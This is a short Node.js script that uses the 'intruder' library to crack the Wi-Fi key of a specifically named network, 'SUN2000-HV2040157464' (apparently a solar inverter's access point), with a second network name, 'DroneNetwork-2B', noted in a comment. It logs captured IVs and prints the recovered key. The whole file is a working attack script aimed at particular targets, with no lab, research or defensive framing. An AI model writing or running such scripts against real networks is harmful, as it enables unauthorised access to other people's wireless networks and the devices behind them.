// @ts-ignore
var Intruder = require('intruder');
var intruder = Intruder();

// SUN2000-HV2040157464
// DroneNetwork-2B

intruder
  .on('attempt', function (ivs) {
    console.log('ivs', ivs);
  })
  .crack('SUN2000-HV2040157464', function (err, key) {
    if (err) throw new Error(err);
    console.log('key', key);
  });
